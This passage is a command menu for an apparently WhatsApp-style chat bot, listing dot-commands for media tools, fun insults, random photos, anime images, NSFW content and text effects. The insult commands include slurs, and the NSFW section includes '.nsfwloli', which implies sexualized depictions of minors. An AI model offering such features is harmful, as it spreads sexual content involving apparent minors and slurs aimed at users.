│ ◦ .mlstalk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .npmstalk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
└ ◦ .ghstalk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*

*— O T H E R  M E N U ッ*

┌ ◦ .ping *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .menu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listpem *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .liststicker *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listimage *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listvideo *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listvn *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listbadword *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listpc *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .listgc *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .owner *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .rentbot *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .listrentbot *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .donate *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .friend *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .obfuscate *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .styletext *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fliptext *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tts *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .say *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .togif *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .toqr *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .bass *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .blown *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .deep *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .earrape *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fast *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fat *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nightcore *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .reverse *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .robot *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .slow *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .smooth *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .squirrel *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tinyurl *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tovn *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .toaudio *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tomp3 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tomp4*ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .toimg *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .toonce *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .sticker *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .take *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .emoji *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .volume *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ebinary *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .dbinary *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ssweb *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .quoted *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .runtime *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .sound1 - sound161 *ғʀᴇᴇ ᴏɴʟʏ*

*— F U N  M E N Uッ*

┌ ◦ .define *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .truth *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .dare *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .couple *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .soulmate *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .stupidcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .handsomecheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .uncleancheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hotcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .smartcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .greatcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .evilcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .dogcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .coolcheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .waifucheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .awesomecheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gaycheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cutecheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .lesbiancheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hornycheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .prettycheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .lovelycheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .uglycheck *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hot *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .sexy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .kind *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .idiot *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .handsome *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .beautiful *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cute *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .pretty *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .lesbian *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .noob *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .bastard *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .foolish *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nerd *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .asshole *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gay *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .smart *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .stubble *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .doggo *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .horny *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cunt *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .wibu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .noobra *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nibba *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nibbi *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .comrade *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .mumu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .rascal *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .scumbag *ғʀᴇᴇ ᴏɴʟʏ* 
│ ◦ .nuts *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fagot *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .scoundrel *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ditch *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .dope *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gucci *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .lit *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .dumbass *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .crackhead *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .mf *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .motherfucker *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .sucker *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fuckboy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .playboy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .fuckgirl *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .playgirl *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .quotes *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .can *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .is *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .when *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .where *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .what *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .how *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .rate *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cry *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kill *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .hug *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .pat *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .lick *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .kiss *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .bite *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .yeet *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .bully *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .bonk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .wink *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .poke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .nom *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .slap *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .smile *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .wave *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .awoo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .blush *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .smug *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .glomp *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .happy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .dance *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cringe *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cuddle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .highfive *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .shinobu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .handhold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .horny *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .checkme *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .confess *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .leave *ғʀᴇᴇ ᴏɴʟʏ*

*— R A N D O M  P H O T O ッ*

┌ ◦ .aesthetic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .coffee *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .wikimedia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .wallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .art *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .bts *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .woof *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .meow *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .lizard *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cosplay *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .hacker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cyber *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .gamewallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .islamic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .jennie *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .jiso *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .satanic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .justina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cartoon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .pentol *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cat *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .kpop *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .exo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .lisa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .space *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .car *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .technology *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .bike *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shortquote *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .antiwork *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hacking *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .boneka *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .rose *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ryujin *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ulzzangboy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ulzzanggirl *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .wallml *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .wallphone *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .mountain *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .goose *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .profilepic *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .couplepic *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .programming *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .pubg *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .blackpink *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .randomboy *ғʀᴇᴇ ᴏɴʟʏ*  
│ ◦ .randomgirl *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hijab *ғʀᴇᴇ ᴏɴʟʏ*  
│ ◦ .chinese *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .indo *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .japanese *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .korean *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .malay *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .thai *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .vietnamese *ғʀᴇᴇ ᴏɴʟʏ*

*— A N I M E ッ*

┌ ◦ .akira *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .akiyama *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .ana *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .asuna *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .ayuzawa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .boruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .chiho *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .chitoge *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cosplayloli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .cosplaysagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .deidara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .doraemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .elaina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .emilia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .erza *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .gremory *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .hestia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .hinata *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .husbu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .inori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .isuzu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .itachi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .itori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kaga *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kagura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kakasih *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kaori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .keneki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kotori *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .kurumi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .loli *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .madara *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .megumin *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .mikasa *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .mikey *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .miku *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .minato *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .naruto *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .neko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .neko2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .nekonime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .nezuko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .onepiece *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .pokemon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .randomnime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .randomnime2 *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .rize *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .sagiri *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .sakura *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .sasuke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shinka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shinomiya *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shizuka *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .shota *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tejina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .toukachan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tsunade *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .waifu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .animewall *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .yotsuba *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .yuki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .yulibocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .yumeko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .8ball *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tickle *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gecg *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .feed *ғʀᴇᴇ ᴏɴʟʏ*

*— N S F W ッ*

┌ ◦ .hentai *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gifhentai *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gifblowjob *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hentaivid *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .hneko *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nwaifu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .animespank *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .trap *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gasm *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ahegao *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ass *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .bdsm *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .blowjob *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cuckold *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .cum *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .milf *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .eba *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ero *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .femdom *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .foot *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gangbang *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .glasses *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .jahy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .masturbation *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .manga *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .neko-hentai *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .neko-hentai2 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .nsfwloli *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .orgy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .panties *ғʀᴇᴇ ᴏɴʟʏ* 
│ ◦ .pussy *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tentacles *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .thights *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .yuri *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .zettai *ғʀᴇᴇ ᴏɴʟʏ*

*— T E X T P R O  M A K E R ッ*

┌ ◦ .candy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .christmas *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .3dchristmas *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .sparklechristmas *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .deepsea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .scifi *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .rainbow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .waterpipe *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .spooky *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .pencil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .circuit *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .discovery *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .metalic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .fiction *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .demon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .transformer *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .berry *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .thunder *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .magma *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .3dstone *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .neonlight *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .glitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .harrypotter *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .brokenglass *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .papercut *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .watercolor *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .multicolor *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .neondevil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .underwater *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .graffitibike *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .snow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .cloud *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .honey *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .ice *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .fruitjuice *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .biscuit *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .wood *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .chocolate *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .strawberry *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .matrix *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .blood *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .dropwater *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .toxic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .lava *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .rock *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .bloodglas *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .hallowen *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .darkgold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .joker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .wicker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .firework *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .skeleton *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
│ ◦ .blackpink *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* 
